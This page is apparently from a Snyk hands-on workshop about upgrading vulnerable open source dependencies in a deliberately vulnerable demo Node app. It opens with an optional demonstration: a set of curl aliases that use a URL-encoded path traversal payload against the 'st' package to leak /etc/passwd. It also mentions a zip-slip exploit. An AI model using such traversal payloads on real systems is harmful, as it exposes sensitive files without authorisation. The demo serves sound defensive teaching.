---
description: >-
  Now we'll find and fix vulnerabilities in the Open Source components that make
  up our application.
---

# Upgrade or patch vulnerable application dependencies

## Optional: The risks of vulnerable dependencies

To see an example of the risks a vulnerable open source component introduces to our running application, we're going to exploit one of those vulnerabilities. The `exploits` folder contains exploits for many of the vulnerable dependencies.

Let's execute an exploit against our running application. We'll demonstrate how the Directory Traversal vulnerability in the `st` package can lead to sensitive information leakage. Start by navigating to the exploits folder and sourcing the `st-exploits.sh` file.

```text
cd exploits && source st-exploits.sh
```

This sets up a series of aliases to demonstrate the exploit. They are shown below:

```text
st1="curl $GOOF_HOST/public/about.html"

# Directory listing (not necessary)
st2="curl $GOOF_HOST/public/"

# Failed ../
st3="curl $GOOF_HOST/public/../../../"

# Exploit start
st4="curl $GOOF_HOST/public/%2e%2e/%2e%2e/%2e%2e/"

# Exploit full
st5="curl $GOOF_HOST/public/%2e%2e/%2e%2e/%2E%2E/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```

The good stuff is in `st4` and `st5`, where we see the leaked contents of the `/etc/passwd` file.

![](../../../.gitbook/assets/st-exploit.png)

Yikes. And this is just one example. Feel free to play around with the other exploits in this folder, the sample application is **very** vulnerable \(for now!\). 

## Start fixing Open Source Vulnerabilities!

In Snyk, this, and other vulnerabilities in our dependencies, are shown under the `package.json` file. Snyk accelerates remediation via Pull Requests to upgrade dependencies to non-vulnerable versions.

{% hint style="info" %}
Notice that the Dockerfile has less vulnerabilities! Snyk auto-retested it after our changes.
{% endhint %}

![](../../../.gitbook/assets/snyk-ossproject.png)

## Fix Vulnerabilities from the Snyk UI

### Step 1: Explore a vulnerability in more detail <a id="step-1-explore-a-vulnerability-in-more-detail"></a>

Click into the `package.json` project, and Scroll down to see the list of vulnerabilities present, ordered by [our proprietary Priority Score](https://snyk.io/blog/snyk-priority-score/). For each Vulnerability, Snyk displays:

* The module that introduced it and, in the case of transitive dependencies, its direct dependency,
* Details on the path and proposed Remediation, as well as the specific vulnerable function.

We'll start with the first vulnerability, **zip slip**, since it's ordered the highest. The exploit for zip-slip is also available in the `exploits` folder in case you want to try it out before patching it.

![](https://gblobscdn.gitbook.com/assets%2F-M3ww0VUnNWDc-FwnwVl%2F-MOHOD925AinvVslRYnk%2F-MOHQWZMgK6Br-LeO6xL%2FSnyk-Vuln.png?alt=media&token=42d70198-322b-463e-b107-f54c12072ec7)

### Step 2: Create a Fix Pull Request in Snyk <a id="step-2-create-a-fix-pull-request-in-snyk"></a>

Since a fix is available, Snyk can automatically upgrade the vulnerable dependency to a non-vulnerable version through a Pull Request. Click on "Fix this vulnerability" to do so.

![](../../../.gitbook/assets/snyk-fixvuln.png)

On the next screen, you'll be able to confirm the issue to fix with this PR.

![](../../../.gitbook/assets/snyk-fixpropen.png)

Looks good! Go ahead and open the PR. Once it's ready, you'll be taken to the PR in GitHub, where you can review the changes in the file diff view:

![](../../../.gitbook/assets/gh-prdiff.png)

Now, go ahead and merge the PR! Back in Snyk, we can appreciate that our `package.json` file has 1 less High Severity Vulnerability.

![](../../../.gitbook/assets/snyk-postfixpr.png)

If you tried the zip-slip exploit, `git pull` the code to bring your local copy up to date with GitHub and try the exploit again. You'll notice it no longer works. 

## Fix Vulnerabilities locally with Snyk 

Fix Pull Requests are great for fixing individual vulnerabilities, and Snyk can [automatically open Pull Requests](https://support.snyk.io/hc/en-us/articles/360006581898-Upgrading-dependencies-with-automatic-PRs) when new fixes to vulnerabilities are published. You can also fix vulnerabilities manually. 

Using the `st` package exploit demonstrated above. Find the `Directory Traversal` vulnerability by looking through the list of issues in Snyk. See that updating `st` to version `0.2.5` fixes this issue.

![](../../../.gitbook/assets/snyk-fixstvuln.png)

Make this change in your package.json file. 

![](../../../.gitbook/assets/st-fixvuln.png)

To ensure this isn't exploitable, re-build and re-deploy the container to Kubernetes.

```text
# Build the new image
docker build $DockerId/goof:dev .

# Push to Docker Hub
docker push $DockerId/goof:dev

# Scale the deployment down and up
kubectl scale deployment goof --replicas=0
kubectl scale deployment goof --replicas=1
```

Now try the exploit again. It should fail spectacularly.

![](../../../.gitbook/assets/post-stfix.png)

## Optional: Use what you learned to fix all vulnerabilities

Either with Fix Pull Requests, or using the information in Snyk to modify your package manager manifest, continue fixing vulnerabilities until you've knocked out the High Severity Vulnerabilities that have a fix available. Some additional resources that can help:

* Snyk IDE Plugins: If you're using JetBrains IDEs, Eclipse, or VS Code, check out [our plugins](https://support.snyk.io/hc/en-us/sections/360001138118-IDE-tools) that show vulnerability and remediation information right within the IDE. 
* For Node applications, like this one, check out [Snyk Wizard](https://support.snyk.io/hc/en-us/articles/360003851357-Manage-vulnerability-results-with-the-Snyk-CLI-wizard)! 

Once you're ready, continue on to the next section to learn how to fix configuration issues in the Kubernetes manifests that deploy the application! 

